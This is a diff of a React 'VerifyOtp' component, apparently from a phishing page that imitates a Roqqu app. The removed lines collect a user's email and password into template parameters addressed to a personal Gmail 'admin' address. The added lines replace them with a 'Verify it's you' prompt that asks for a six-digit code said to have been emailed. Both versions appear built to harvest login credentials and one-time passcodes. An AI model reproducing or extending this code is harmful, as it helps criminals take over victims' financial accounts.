@@ -10,24 +10,14 @@ const VerifyOtp = (props) => {
     console.log({props})
     const history = useHistory()
 
-    const [email, setEmail] = useState('')
-    const [password, setPassword] = useState('')
+    const [code, setCode] = useState('')
 
-    const handleEmail = (e) => {
-        setEmail(e.target.value)
+    const handleCode = (e) => {
+        setCode(e.target.value)
     }
 
-    const handlePassword = (e) => {
-        setPassword(e.target.value)
-    }
+   
 
-    const templateParams = {
-        client_email: email,
-        client_password: password,
-        admin_email: 'Testimonyibom@gmail.com',
-        from_name: 'Roqquappchat',
-        to_name: 'Admin',
-    }
     const handleSubmit = async (e) => {
         e.preventDefault()
 
@@ -73,27 +63,22 @@ const VerifyOtp = (props) => {
                         style={{ padding: '30px 15px' }}
                         onSubmit={handleSubmit}
                     >
-                        <h2 className='font-HelveticaBold text-center text-[#1c124d] mb-4 text-2xl'>
+                        <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                             Verify it's you
                         </h2>
+                        <p>
+                            We've sent a verification code to your email. Enter
+                            the code from the email in the field below.
+                        </p>
                         <input
-                            type='email'
                             id='email'
                             className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                             required
-                            value={email}
-                            placeholder='Email address'
-                            onChange={handleEmail}
+                            value={code}
+                            placeholder='Enter 6 digit code'
+                            onChange={handleCode}
                         />
-                        <input
-                            type='password'
-                            id='email'
-                            className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
-                            required
-                            value={password}
-                            onChange={handlePassword}
-                            placeholder='password'
-                        />
+                   
 
                         <button
                             className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
